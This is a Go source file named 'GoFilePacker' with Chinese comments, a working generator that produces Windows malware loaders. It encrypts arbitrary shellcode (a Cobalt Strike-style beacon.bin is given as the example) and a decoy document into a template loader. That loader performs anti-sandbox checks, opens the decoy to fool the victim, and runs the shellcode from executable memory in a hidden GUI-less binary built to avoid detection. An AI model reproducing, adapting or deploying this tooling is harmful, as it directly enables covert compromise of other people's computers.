// 文件名: generator.go
//
// GoFilePacker: 高级 Go 语言荷载加载器生成器 (最终版 - Fire and Forget)

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ______      ____  _                          _   
  / ____/___  / __ \(_)___  ____  ___  _________/ |  
 / / __/ __ \/ /_/ / / __ \/ __ \/ _ \/ ___/ __  /   
/ /_/ / /_/ / ____/ / / / / / / /  __/ /  / /_/ /    
\____/\____/_/   /_/_/ /_/_/ /_/\___/_/   \__,_/     
                                                    
              >> Advanced Payload Loader Generator <<
                                           by hsad
`

// loaderTemplate 是最终加载器可执行文件的 Go 源代码。
const loaderTemplate = `
//go:build windows
// +build windows

// 最终加载器 - 此代码由 GoFilePacker 生成
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 这些常量由生成器动态替换。
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesKeyBase64             = "{{.Key}}"
	decoyFileName            = "{{.DecoyFileName}}"
)

// setupLogging 设置日志输出到文件，方便在无控制台模式下调试
func setupLogging() {
	logFile, err := os.OpenFile(filepath.Join(os.Getenv("PUBLIC"), "loader_log.txt"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err == nil {
		log.SetOutput(logFile)
	}
	log.Println("--- Loader execution started ---")
}

// decryptAESGCM 使用 AES-256-GCM 解密数据。
func decryptAESGCM(encodedCiphertext, encodedKey string) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(encodedKey)
	if err != nil {
		return nil, fmt.Errorf("密钥解码失败: %v", err)
	}
	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil {
		return nil, fmt.Errorf("密文解码失败: %v", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("创建新密码块失败: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建新 GCM 失败: %v", err)
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("密文过短")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("解密失败: %v", err)
	}
	return plaintext, nil
}

// antiSandboxChecks 执行基本的环境检查以检测沙箱。
func antiSandboxChecks() {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	globalMemoryStatusEx := kernel32.NewProc("GlobalMemoryStatusEx")

	type memoryStatusEx struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}

	var memStatex memoryStatusEx
	memStatex.Length = uint32(unsafe.Sizeof(memStatex))
	
	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatex)))
	if ret != 0 {
		if memStatex.TotalPhys/1024/1024/1024 < 4 {
			os.Exit(0)
		}
	}

	if runtime.NumCPU() < 2 {
		os.Exit(0)
	}
}

// executeShellcode 分配内存，复制 shellcode，并在一个新线程中执行它。
// [!] 修改点: 移除了 WaitForSingleObject，实现"Fire and Forget"
func executeShellcode(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	createThread := kernel32.NewProc("CreateThread")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return // Allocation failed
	}

	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	copy(dst, shellcode)
	
	// Launch the thread and immediately return. Do not wait for it.
	createThread.Call(0, 0, addr, 0, 0, 0)
}

func main() {
	// Anti-sandbox and logging can be removed for the final production version
	// to reduce binary size and behavioral signatures.
	// setupLogging() 
	antiSandboxChecks()

	// Decoy file execution
	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesKeyBase64)
	if err == nil {
		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
		
		verb, _ := windows.UTF16PtrFromString("open")
		path, _ := windows.UTF16PtrFromString(decoyPath)
		windows.ShellExecute(0, verb, path, nil, nil, windows.SW_SHOWNORMAL)
	}
	
	// Shellcode execution in a new goroutine
	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesKeyBase64)
	if err != nil {
		return
	}
	executeShellcode(shellcode)

	// The main program can exit here. For the test, a small sleep ensures
	// the decoy has time to pop, but in a real scenario, you might exit faster.
	time.Sleep(2 * time.Second)
}
`

// TemplateData holds the data to be injected into the loader template.
type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Key              string
	DecoyFileName    string
}

// encryptAESGCM encrypts data using a given key with AES-256-GCM.
func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	// [+] 修改点: 打印 Logo 替换旧的标题
	log.SetFlags(0) // 移除 log 的时间戳等前缀，让 Logo 更干净
	log.Println(logo)

	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or TXT).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" {
		log.Println("Error: Both -decoy and -payload flags are required.")
		log.Println("Usage: go run generator.go -decoy <path_to_decoy> -payload <path_to_payload> [-out <output_name>]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}
	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	log.Println("[+] Generating unique AES-256-GCM key...")
	aesKey := make([]byte, 32) // 32 bytes for AES-256
	if _, err := rand.Read(aesKey); err != nil {
		log.Fatalf("[-] Failed to generate AES key: %v", err)
	}

	log.Println("[+] Encrypting decoy file with shared key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same shared key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Key:              base64.StdEncoding.EncodeToString(aesKey),
		DecoyFileName:    filepath.Base(*decoyFile),
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", "-s -w -H windowsgui", tmpfile.Name())
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("[-] Compilation failed:\n%s", string(output))
	}

	log.Printf("\n[✓] Successfully generated loader: %s", *outputFile)
}
